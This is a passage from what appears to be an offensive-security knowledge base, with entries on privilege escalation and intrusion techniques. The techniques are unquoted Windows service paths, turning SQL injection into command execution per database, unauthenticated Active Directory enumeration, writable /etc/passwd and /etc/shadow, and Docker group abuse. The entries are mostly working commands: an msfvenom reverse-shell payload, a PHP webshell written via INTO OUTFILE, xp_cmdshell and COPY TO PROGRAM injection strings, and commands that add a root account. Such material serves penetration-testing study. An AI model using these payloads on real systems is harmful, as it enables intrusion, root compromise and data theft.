(F)/(M)/(W) for your user or Authenticated Users/Everyone).

## Exploit
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o Some.exe
    copy Some.exe "C:\Program Files\Some App\Some.exe"   # name = the first unquoted segment
    # trigger: restart the service (if you can) or wait for a reboot:
    sc stop <svc> & sc start <svc>     # or shutdown /r
PowerUp (`Get-UnquotedService` / `Write-ServiceBinary`) and winPEAS flag and even auto-exploit these.

## Pattern
"Unquoted path + a space + a writable intermediate folder + ability to (re)start -> drop a named
binary -> SYSTEM." One of the standard Windows service-misconfig wins. (See: windows-service-privesc,
windows-privesc-checklist, windows-potato-attacks.)

entries.title: From SQL injection to RCE — per-DBMS
entries.brief: How a confirmed SQLi becomes file write / command execution on each major database
entries.body:
## The idea
Data exfiltration (dumping tables) is the obvious SQLi impact, but each DBMS also has features that,
when the DB user is privileged enough, turn injection into **file read/write or command execution**.
Know the one for the database you're facing.

## MySQL / MariaDB — write a webshell
If `FILE` privilege is granted and `secure_file_priv` allows it, and you know the webroot:
    ... UNION SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/sh.php'-- -
Then browse `sh.php?c=id`. Read files too: `LOAD_FILE('/etc/passwd')`.

## MSSQL — xp_cmdshell
If the DB user is sysadmin (or can impersonate one), enable and call xp_cmdshell straight from the
injection (stacked queries):
    '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;
      RECONFIGURE; EXEC xp_cmdshell 'whoami'-- -
(See mssql-abuse for the full flow, impersonation and linked servers.)

## PostgreSQL — COPY ... PROGRAM
On 9.3+ as a superuser:
    '; COPY (SELECT '') TO PROGRAM 'id'-- -
    -- or create a function from a shared lib; or large-object file write.
Read files with `COPY ... FROM '/etc/passwd'` into a temp table.

## Oracle / others
Oracle has `DBMS_SCHEDULER`, Java stored procs, and UTL_FILE for similar effects when privileged.

## Workflow
1. Confirm SQLi + identify the DBMS (error strings, `@@version`, `version()`).
2. Check the **current user's privileges** (FILE / sysadmin / superuser) and whether **stacked
   queries** are possible.
3. Pick the matching primitive; know the **webroot** for OUTFILE webshells (LFI/errors leak it).
sqlmap automates much of this (`--os-shell`, `--file-write`) once you've found the injection.

## Pattern
"Confirm SQLi -> fingerprint DBMS -> check privileges -> use that DB's file-write/exec feature."
(See: sqli-logic, sqlmap-workflow, mssql-abuse, file-read-primitives.)

entries.title: AD enumeration without credentials
entries.brief: What you can learn about a domain from an unauthenticated foothold on the network
entries.body:
## The goal
Before you have any domain password, squeeze the network for names, users and misconfigs. Any of
these can hand you the first credential (for spraying/roasting).

## Anonymous SMB / null sessions
    nxc smb <DC-IP> -u '' -p ''            # null session?
    nxc smb <DC-IP> -u 'guest' -p ''       # guest enabled?
    smbclient -L //<DC-IP>/ -N             # list shares anonymously
    enum4linux-ng -A <DC-IP>               # one-shot: users, shares, policy, RID range
Readable shares (SYSVOL/NETLOGON especially) leak scripts, GPP cpassword, and configs.

## Anonymous LDAP
    ldapsearch -x -H ldap://<DC-IP> -s base namingContexts      # get the base DN
    ldapsearch -x -H ldap://<DC-IP> -b 'DC=corp,DC=local'       # anonymous bind?
If anonymous bind is allowed you may read users, descriptions (passwords hide in `description`!),
and group membership.

## RID cycling (names from a null/guest session)
    nxc smb <DC-IP> -u guest -p '' --rid-brute
    # or: lookupsid.py anonymous@<DC-IP>
Turns SIDs into a **username list** even without creds -> feed AS-REP roasting (GetNPUsers) and
kerbrute userenum.

## Kerberos user enumeration (no password)
    kerbrute userenum -d corp.local --dc <DC-IP> users.txt     # valid vs invalid users
    impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip <DC>   # AS-REP roastable?

## DNS / hostnames
    dig @<DC-IP> corp.local any ; nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local <DC-IP>
SRV records reveal DCs and services.

## Pattern
"Null/guest SMB + anonymous LDAP + RID cycling -> a username list -> kerbrute + AS-REP roast -> a
first credential." Enumeration buys the foothold. (See: asreproasting, password-spraying,
smb-enumeration-checklist, ldap-enum.)

entries.title: Writable /etc/passwd or /etc/shadow = root
entries.brief: Why write access to the account files is an instant root, and the exact trick
entries.body:
## The logic
`/etc/passwd` and `/etc/shadow` define who can log in and with what password hash. If a
misconfiguration makes either **writable by your user** (check with `ls -l`), you can **add a root
account** or **overwrite root's hash** and `su` to it.

## /etc/passwd is writable
Historically `passwd` could hold the hash in its 2nd field (an `x` means "look in shadow"). If you can
write passwd, add a new UID-0 user with a hash **you** choose:
    openssl passwd -1 -salt xyz hacked        # make a crypt hash for the password "hacked"
    # -> $1$xyz$<hash>  ; append a root-equivalent line:
    echo 'hax:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
    su hax            # password: hacked   -> UID 0
Putting the hash directly in passwd overrides shadow for that account.

## /etc/shadow is writable
Generate a hash and replace **root's** 2nd field:
    openssl passwd -6 newpass          # SHA-512 ($6$...), matching modern shadow
    # edit /etc/shadow: set root's hash field to the generated $6$... value
    su root            # password: newpass
(`-6` = SHA-512, `-1` = MD5, `-5` = SHA-256. Match what the file already uses.)

## Also check: readable shadow
Even just **readable** `/etc/shadow` is a win — copy it + `/etc/passwd`, `unshadow` them, and crack
with john/hashcat (see shadow-file, password-cracking-workflow).

## How it happens
Over-broad `chmod 777`, a backup/restore script, or a writable file via a group. Spot it in the perms
pass: `ls -l /etc/passwd /etc/shadow`, and LinPEAS flags writable sensitive files.

## Pattern
"Can I write passwd/shadow? -> openssl passwd a hash -> add UID-0 user or overwrite root -> su."
One of the fastest Linux roots when the misconfig exists. (See: passwd-file, shadow-file,
etc-config-files, suid-concept.)

entries.title: Docker group / socket = root on the host
entries.brief: Why access to the Docker daemon is equivalent to root, and how to use it
entries.body:
## The core fact
The Docker daemon runs as **root**. Anyone who can talk to it — by being in the **docker group**, or
because the socket **/var/run/docker.sock** is readable/writable, or a Docker TCP port is exposed —
can start a container that **mounts the host filesystem** and thereby **read/write anything as root**.
Docker group membership is effectively root; this is documented, not a bug.

## Confirm
    id                       # 'docker' in your groups?
    ls -l /var/run/docker.sock
    docker ps                # can you talk to the daemon?

## Exploit — mount the host and chroot
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    # you are now root on the HOST filesystem (/mnt is the host's /):
    #   add a UID-0 user to /etc/passwd, drop an SSH key, or read /root, /etc/shadow
If you can't pull images, use one already present: `docker images`, then use that name.

## Via the raw socket (no docker CLI)
If only the socket is exposed, drive the API with curl to create a host-mounting container; or if a
